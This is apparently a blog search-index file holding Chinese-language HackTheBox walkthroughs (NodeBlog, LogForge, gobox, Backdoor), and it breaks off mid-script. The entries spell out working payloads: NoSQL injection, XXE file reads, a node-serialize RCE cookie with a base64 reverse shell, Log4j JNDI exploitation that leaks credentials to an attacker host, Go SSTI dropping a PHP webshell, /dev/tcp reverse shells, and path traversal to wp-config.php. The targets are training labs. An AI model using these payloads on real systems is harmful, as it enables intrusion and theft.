<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NodeBlog</title>
      <link href="/2022/08/31/nodeblog/"/>
      <url>/2022/08/31/nodeblog/</url>
      
        <content type="html"><![CDATA[<h1 id="NodeBlog"><a href="#NodeBlog" class="headerlink" title="NodeBlog"></a>NodeBlog</h1><p>目标: 10.10.11.139</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">nmap 10.10.11.139 -Pn -sC --min-rate&#x3D;300 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/nodeblog/image_d0nRR2ROyx.png"></p><p>5000端口为http服务</p><p><img src="/2022/08/31/nodeblog/image_YQNAPTOpsI.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>发现是express，此时需要考虑nosql注入了</p><p><img src="/2022/08/31/nodeblog/image_AIY7HTOIZ4.png"></p><p>改为json格式可以网站正常接受数据</p><p><img src="/2022/08/31/nodeblog/image_TrGs3aHVp-.png"></p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">&#123;&quot;user&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功登录</p><p>上传处发现需要上传xml格式</p><p><img src="/2022/08/31/nodeblog/image_wo25Q-uS8b.png"></p><p>数据包中发现了样例模板</p><p><img src="/2022/08/31/nodeblog/image_9viBZCLk0m.png"></p><p>于是构造上传markdown</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;post&gt;    &lt;title&gt;q&lt;&#x2F;title&gt;    &lt;description&gt;123&lt;&#x2F;description&gt;    &lt;markdown&gt;&amp;file;&lt;&#x2F;markdown&gt;&lt;&#x2F;post&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功读取</p><p><img src="/2022/08/31/nodeblog/image_GnKxP--74O.png"></p><p>通过保存信息查找server.js路径，查看反序列化路径</p><p><img src="/2022/08/31/nodeblog/image_2fouBSCiJ9.png"></p><p>这里找到位置在&#x2F;opt&#x2F;blog&#x2F;server.js，读取</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">const express &#x3D; require(&#39;express&#39;)const mongoose &#x3D; require(&#39;mongoose&#39;)const Article &#x3D; require(&#39;.&#x2F;models&#x2F;article&#39;)const articleRouter &#x3D; require(&#39;.&#x2F;routes&#x2F;articles&#39;)const loginRouter &#x3D; require(&#39;.&#x2F;routes&#x2F;login&#39;)const serialize &#x3D; require(&#39;node-serialize&#39;)const methodOverride &#x3D; require(&#39;method-override&#39;)const fileUpload &#x3D; require(&#39;express-fileupload&#39;)const cookieParser &#x3D; require(&#39;cookie-parser&#39;);const crypto &#x3D; require(&#39;crypto&#39;)const cookie_secret &#x3D; &quot;UHC-SecretCookie&quot;&#x2F;&#x2F;var session &#x3D; require(&#39;express-session&#39;);const app &#x3D; express()mongoose.connect(&#39;mongodb:&#x2F;&#x2F;localhost&#x2F;blog&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.use(express.urlencoded(&#123; extended: false &#125;))app.use(methodOverride(&#39;_method&#39;))app.use(fileUpload())app.use(express.json());app.use(cookieParser());&#x2F;&#x2F;app.use(session(&#123;secret: &quot;UHC-SecretKey-123&quot;&#125;));function authenticated(c) &#123;    if (typeof c &#x3D;&#x3D; &#39;undefined&#39;)        return false    c &#x3D; serialize.unserialize(c)    if (c.sign &#x3D;&#x3D; (crypto.createHash(&#39;md5&#39;).update(cookie_secret + c.user).digest(&#39;hex&#39;)) )&#123;        return true    &#125; else &#123;        return false    &#125;&#125;app.get(&#39;&#x2F;&#39;, async (req, res) &#x3D;&gt; &#123;    const articles &#x3D; await Article.find().sort(&#123;        createdAt: &#39;desc&#39;    &#125;)    res.render(&#39;articles&#x2F;index&#39;, &#123; articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) &#125;)&#125;)app.use(&#39;&#x2F;articles&#39;, articleRouter)app.use(&#39;&#x2F;login&#39;, loginRouter)app.listen(5000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现使用了node-serialize</p><p>检测是否存在<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" title="CVE-2017-5941">CVE-2017-5941</a></p><p>可以看到这里是在cookie处进行的序列化与反序列化，使用Poc</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123;require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;,function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;()&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造反弹shell</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function()%7Brequire(%27child_process%27).exec(%27echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4yLzg4ODcgMD4mMQo%3D%7Cbase64%20-d%7Cbash%27%2C%20function(error%2C%20stdout%2C%20stderr)%7Bconsole.log(stdout)%7D)%3B%7D()%22%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/nodeblog/image_jfLD4znddj.png"></p><p><img src="/2022/08/31/nodeblog/image_Z-R4zRs_Ap.png"></p><p>使用script技巧升级</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">script &#x2F;dev&#x2F;null -c bash^Zstty raw -echo; fg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>直接使用CVE-2021-4034 pkexec 本地提权即可</p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LogForge</title>
      <link href="/2022/08/31/logforge/"/>
      <url>/2022/08/31/logforge/</url>
      
        <content type="html"><![CDATA[<h1 id="LogForge"><a href="#LogForge" class="headerlink" title="LogForge"></a>LogForge</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>目标:10.10.11.138</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">nmap 10.10.11.138 -Pn -v --min-rate&#x3D;300 -sV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/logforge/image_SC_rHyGG6f.png"></p><p>80端口:</p><p><img src="/2022/08/31/logforge/image_Jq0eAsedek.png"></p><p>由于8080为tomcat使用以下方式绕过限制</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">http:&#x2F;&#x2F;10.10.11.138&#x2F;;param&#x3D;value&#x2F;manager&#x2F;html&#x2F;upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/logforge/image_K3ADC8Ldge.png"></p><p>上传shell得到以下提示</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">FAIL - Deploy Upload Failed, Exception: [org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field deployWar exceeds its maximum permitted size of 1 bytes.]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以没法上传，尝试log4j 漏洞，可控文字只有上传的文件名</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzU1NTUgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;10.10.16.2&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到shell</p><p><img src="/2022/08/31/logforge/image_ABZazLnNWF.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>ftp是由java运行的</p><p><img src="/2022/08/31/logforge/image_YehANroxjf.png"></p><p>找到文件进行反编译</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">private String validUser &#x3D; System.getenv(&quot;ftp_user&quot;);private String validPassword &#x3D; System.getenv(&quot;ftp_password&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>发现ftp用户名密码都在环境变量中</p><p>于是在ftp登录用户名处输入</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">$&#123;jndi:ldap:&#x2F;&#x2F;10.10.16.2:1389&#x2F;$&#123;env:ftp_user&#125;:$&#123;env:ftp_password&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在wireshake中进行监听即可得到用户名密码  ippsec:log4j_env_leakage</p><p>登录后修改目录即可访问root.txt</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">lcd &#x2F;tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gobox</title>
      <link href="/2022/08/31/gobox/"/>
      <url>/2022/08/31/gobox/</url>
      
        <content type="html"><![CDATA[<h1 id="gobox"><a href="#gobox" class="headerlink" title="gobox"></a>gobox</h1><h3 id="目标：10-10-11-113"><a href="#目标：10-10-11-113" class="headerlink" title="目标：10.10.11.113"></a>目标：10.10.11.113</h3><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p><img src="/2022/08/31/gobox/image_Zwokvo4iz2.png"></p><p>80端口:</p><p><img src="/2022/08/31/gobox/image_Gw8c2mIQvf.png"></p><p>顶部提示可能使用sstl模板</p><p>尝试目录扫描</p><p><img src="/2022/08/31/gobox/image_y4dIB8u1tc.png"></p><p>未发现有用的信息</p><p>4566端口返回403</p><p>8080端口:</p><p><img src="/2022/08/31/gobox/image_kZKSl0dpjF.png"></p><p>在忘记密码处</p><p><img src="/2022/08/31/gobox/image_fxpcs675IY.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>存在回显，可能存在模板注入</p><p><img src="/2022/08/31/gobox/image_M1z-cxuseB.png"></p><p>提示go,则网站由go写的sstl,直接尝试</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123; . &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/gobox/image_ymAW_oMLAX.png"></p><p>尝试利用其登录</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">ippsec@hacking.esports ippsSecretPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/gobox/image_wThLZqAq3Q.png"></p><p><img src="/2022/08/31/gobox/image_ng1ySrpD7l.png"></p><p>判断是否为docker容器</p><p><img src="/2022/08/31/gobox/image_Ch1y0R-nWv.png"></p><p><img src="/2022/08/31/gobox/image_vomvQgGEfp.png"></p><p>通过hostname判断其为aws</p><p><img src="/2022/08/31/gobox/image_ctrvo0Xayd.png"></p><p>aws敏感文件判断</p><p>参考<a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-configure-files.html" title="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-configure-files.html">https://docs.aws.amazon.com/zh_cn&#x2F;cli&#x2F;latest&#x2F;userguide&#x2F;cli-configure-files.html</a></p><p><img src="/2022/08/31/gobox/image_vOYyouuA36.png"></p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">aws_access_key_id&#x3D;SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRzaws_secret_access_key&#x3D;SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/08/31/gobox/image_bOmjoCKuOe.png"></p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">   &quot;Buckets&quot;: [        &#123;            &quot;Name&quot;: &quot;website&quot;,            &quot;CreationDate&quot;: &quot;2022-01-11T06:05:46.000Z&quot;        &#125;    ],    &quot;Owner&quot;: &#123;        &quot;DisplayName&quot;: &quot;webfile&quot;,        &quot;ID&quot;: &quot;bcaf1ffd86f41161ca5fb16fd081034f&quot;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到有一个名字为webfile的对象存储服务，先看看有哪些文件</p><p><img src="/2022/08/31/gobox/image_5RC4fMlEHf.png"></p><p>我们访问<a href="http://10.10.11.113/header.png" title="http://10.10.11.113/header.png">http://10.10.11.113/header.png</a>可以看到，那么此docker容器仅仅是8080端口的服务，我们在webfile存储对象中上传shell即可获取真实机器的权限</p><p>上传shell</p><p><img src="/2022/08/31/gobox/image_UIYt9EMVK_.png"></p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">由于存在+号，所以在burp中需要将此base64 payload进行url编码email&#x3D;&#123;&#123; .DebugCmd &quot;echo -n %50%44%39%77%61%48%41%67%5a%57%4e%6f%62%79%42%7a%61%47%56%73%62%46%39%6c%65%47%56%6a%4b%43%52%66%55%6b%56%52%56%55%56%54%56%46%74%77%59%58%4e%7a%58%53%6b%37%49%44%38%2b%43%67%3d%3d | base64 -d &gt; &#x2F;tmp&#x2F;a.php&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接着复制到webfile存储对象中</p><p><img src="/2022/08/31/gobox/image_ms8CPw_44q.png"></p><p><img src="/2022/08/31/gobox/image_2yvUNxRzQZ.png"></p><p>成功，尝试反弹shell</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">http:&#x2F;&#x2F;10.10.11.113&#x2F;a.php?pass&#x3D;bash+-c+%27bash+-i+%3E%26+&#x2F;dev&#x2F;tcp&#x2F;10.10.16.2&#x2F;5559+0%3E%261%27<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/gobox/image_7jIrEM1W18.png"></p><p>利用script &#x2F;dev&#x2F;null -c bash</p><p>原因当提权时，由于使用的是伪终端</p><p><img src="/2022/08/31/gobox/image_PNi31UtWVh.png"></p><p><img src="/2022/08/31/gobox/image_1s2FHDaP4I.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在&#x2F;etc&#x2F;nginx&#x2F;sites-enabled中有nginx配置的各种主机</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">### You should look at the following URL&#39;s in order to grasp a solid understanding# of Nginx configuration files in order to fully unleash the power of Nginx.# https:&#x2F;&#x2F;www.nginx.com&#x2F;resources&#x2F;wiki&#x2F;start&#x2F;# https:&#x2F;&#x2F;www.nginx.com&#x2F;resources&#x2F;wiki&#x2F;start&#x2F;topics&#x2F;tutorials&#x2F;config_pitfalls&#x2F;# https:&#x2F;&#x2F;wiki.debian.org&#x2F;Nginx&#x2F;DirectoryStructure## In most cases, administrators will remove this file from sites-enabled&#x2F; and# leave it as reference inside of sites-available where it will continue to be# updated by the nginx packaging team.## This file will automatically load configuration files provided by other# applications, such as Drupal or Wordpress. These applications will be made# available underneath a path with that package name, such as &#x2F;drupal8.## Please see &#x2F;usr&#x2F;share&#x2F;doc&#x2F;nginx-doc&#x2F;examples&#x2F; for more detailed examples.### Default server configuration#server &#123;        listen 4566 default_server;        root &#x2F;var&#x2F;www&#x2F;html;        index index.html index.htm index.nginx-debian.html;        server_name _;        location &#x2F; &#123;                if ($http_authorization !~ &quot;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&quot;) &#123;                    return 403;                &#125;                proxy_pass http:&#x2F;&#x2F;127.0.0.1:9000;        &#125;&#125;server &#123;        listen 80;        root &#x2F;opt&#x2F;website;        index index.php;        location ~ [^&#x2F;]\.php(&#x2F;|$) &#123;            fastcgi_index index.php;            fastcgi_param REQUEST_METHOD $request_method;            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;            fastcgi_param QUERY_STRING $query_string;            fastcgi_pass unix:&#x2F;tmp&#x2F;php-fpm.sock;        &#125;&#125;server &#123;        listen 8080;        add_header X-Forwarded-Server golang;        location &#x2F; &#123;                proxy_pass http:&#x2F;&#x2F;127.0.0.1:9001;        &#125;&#125;server &#123;        listen 127.0.0.1:8000;        location &#x2F; &#123;                command on;        &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个server是监听4566,进行http_authorization，如果正确便转发到本地9090端口</p><p>本地9090再次转发，这里没什么可利用的</p><p><img src="/2022/08/31/gobox/image_Lq1ZroQso8.png"></p><p>第2，3个服务同样转发到golang容器，查看第四个</p><p>最后一个内容只有command on,查看nginx模块</p><p><img src="/2022/08/31/gobox/image_ah-9pX-dZ-.png"></p><p>50-backdoor.conf看起来很可疑</p><p><img src="/2022/08/31/gobox/image_5FtHaBm695.png"></p><p>通过搜索找到这个模块</p><p><img src="/2022/08/31/gobox/image_gTUrci6KGO.png"></p><p>可是通过上述方法无法执行命令，猜测参数应该换了，根据提示信息</p><p><img src="/2022/08/31/gobox/image_rxwHH6sCvB.png"></p><p>找到ngx_http_execute_module.so，在其中通过strings找到可打印的字符,再寻找run</p><p><img src="/2022/08/31/gobox/image_h1cTUzAGd0.png"></p><p>此时便可执行命令了</p><p><img src="/2022/08/31/gobox/image_eJf3la9h5C.png"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Backdoor</title>
      <link href="/2022/08/31/backdoor/"/>
      <url>/2022/08/31/backdoor/</url>
      
        <content type="html"><![CDATA[<h1 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h1><p>目标:10.10.11.125</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集:"></a>信息搜集:</h2><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">nmap 10.10.11.125 -min-parallelism&#x3D;10 --min-rate&#x3D;1000 -p- -Pn -A -sV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/backdoor/image_xJ1gx6432t.png"></p><p>可以看到开放了三个端口，22,80,1337</p><p>80端口为wordpress,使用wpscan 进行扫描</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">wpscan --url http:&#x2F;&#x2F;10.10.11.125 -e vp --plugins-detection mixed --api-token xxxxxxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/backdoor/image_FlQPHO-eLH.png"></p><p>显示存在ebook download &lt;1.2目录遍历漏洞</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用searchsploit 进行搜索</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">searchsploit Ebook Download<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/08/31/backdoor/image_beWpu6QY2k.png"></p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">&#x2F;wp-content&#x2F;plugins&#x2F;ebook-download&#x2F;filedownload.php?ebookdownloadurl&#x3D;..&#x2F;..&#x2F;..&#x2F;wp-config.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>wp-config.php:</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">..&#x2F;..&#x2F;..&#x2F;wp-config.php..&#x2F;..&#x2F;..&#x2F;wp-config.php..&#x2F;..&#x2F;..&#x2F;wp-config.php&lt;?php&#x2F;** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the installation. * You don&#39;t have to use the web site, you can copy this file to &quot;wp-config.php&quot; * and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;editing-wp-config-php&#x2F; * * @package WordPress *&#x2F;&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;&#x2F;** The name of the database for WordPress *&#x2F;define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );&#x2F;** MySQL database username *&#x2F;define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );&#x2F;** MySQL database password *&#x2F;define( &#39;DB_PASSWORD&#39;, &#39;MQYBJSaD#DxG6qbm&#39; );&#x2F;** MySQL hostname *&#x2F;define( &#39;DB_HOST&#39;, &#39;localhost&#39; );&#x2F;** Database charset to use in creating database tables. *&#x2F;define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );&#x2F;** The database collate type. Don&#39;t change this if in doubt. *&#x2F;define( &#39;DB_COLLATE&#39;, &#39;&#39; );&#x2F;**#@+ * Authentication unique keys and salts. * * Change these to different unique phrases! You can generate these using * the &#123;@link https:&#x2F;&#x2F;api.wordpress.org&#x2F;secret-key&#x2F;1.1&#x2F;salt&#x2F; WordPress.org secret-key service&#125;. * * You can change these at any point in time to invalidate all existing cookies. * This will force all users to have to log in again. * * @since 2.6.0 *&#x2F;&#x2F;* That&#39;s all, stop editing! Happy blogging. *&#x2F;&#x2F;** Absolute path to the WordPress directory. *&#x2F;if ( !defined(&#39;ABSPATH&#39;) )define(&#39;ABSPATH&#39;, dirname(__FILE__) . &#39;&#x2F;&#39;);&#x2F;* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC *&#x2F;$currenthost &#x3D; &quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;];$currentpath &#x3D; preg_replace(&#39;@&#x2F;+$@&#39;,&#39;&#39;,dirname($_SERVER[&#39;SCRIPT_NAME&#39;]));$currentpath &#x3D; preg_replace(&#39;&#x2F;\&#x2F;wp.+&#x2F;&#39;,&#39;&#39;,$currentpath);define(&#39;WP_HOME&#39;,$currenthost.$currentpath);define(&#39;WP_SITEURL&#39;,$currenthost.$currentpath);define(&#39;WP_CONTENT_URL&#39;, $currenthost.$currentpath.&#39;&#x2F;wp-content&#39;);define(&#39;WP_PLUGIN_URL&#39;, $currenthost.$currentpath.&#39;&#x2F;wp-content&#x2F;plugins&#39;);define(&#39;DOMAIN_CURRENT_SITE&#39;, $currenthost.$currentpath );@define(&#39;ADMIN_COOKIE_PATH&#39;, &#39;.&#x2F;&#39;);define( &#39;AUTH_KEY&#39;,         &#39;put your unique phrase here&#39; );define( &#39;SECURE_AUTH_KEY&#39;,  &#39;put your unique phrase here&#39; );define( &#39;LOGGED_IN_KEY&#39;,    &#39;put your unique phrase here&#39; );define( &#39;NONCE_KEY&#39;,        &#39;put your unique phrase here&#39; );define( &#39;AUTH_SALT&#39;,        &#39;put your unique phrase here&#39; );define( &#39;SECURE_AUTH_SALT&#39;, &#39;put your unique phrase here&#39; );define( &#39;LOGGED_IN_SALT&#39;,   &#39;put your unique phrase here&#39; );define( &#39;NONCE_SALT&#39;,       &#39;put your unique phrase here&#39; );&#x2F;**#@-*&#x2F;&#x2F;** * WordPress database table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! *&#x2F;$table_prefix &#x3D; &#39;wp_&#39;;&#x2F;** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the documentation. * * @link https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;debugging-in-wordpress&#x2F; *&#x2F;define( &#39;WP_DEBUG&#39;, false );&#x2F;* Add any custom values between this line and the &quot;stop editing&quot; line. *&#x2F;&#x2F;* That&#39;s all, stop editing! Happy publishing. *&#x2F;&#x2F;** Absolute path to the WordPress directory. *&#x2F;if ( ! defined( &#39;ABSPATH&#39; ) ) &#123;  define( &#39;ABSPATH&#39;, __DIR__ . &#39;&#x2F;&#39; );&#125;&#x2F;** Sets up WordPress vars and included files. *&#x2F;require_once ABSPATH . &#39;wp-settings.php&#39;;&lt;script&gt;window.close()&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据库密码:MQYBJSaD#DxG6qbm</p><p>接下来尝试对wordpress进行登录，首先尝试获取用户名</p><p><img src="/2022/08/31/backdoor/image_h-vO8QgL1l.png"></p><p>尝试后台登录，失败</p><p>尝试读取root目录文件，失败，此时可结合文件读取对&#x2F;proc&#x2F;pid&#x2F;cmdline文件进行读取，尝试查找含有1337端口的服务，写了个临时脚本</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">import requestsfrom threading import Thread,localfrom concurrent.futures import ThreadPoolExecutorimport queuea&#x3D;0b&#x3D;&#39;&#39;def burst(i):    global a    global b    if a&#x3D;&#x3D;0:        url&#x3D;u+i+&#39;&#x2F;cmdline&#39;        #print(url)        result&#x3D;requests.get(url,timeout&#x3D;2,proxies&#x3D;&#123;&#39;http&#39;:&#39;http:&#x2F;&#x2F;192.168.31.135:7777&#39;&#125;)        print(result.text)        if &#39;1337&#39; in result.text and i !&#x3D;&#39;1337&#39;:            b&#x3D;result.text            a&#x3D;1            return    else:        returnif __name__&#x3D;&#x3D;&quot;__main__&quot;:    list&#x3D;[]    for i in range(1,10000):        list.append(str(i))    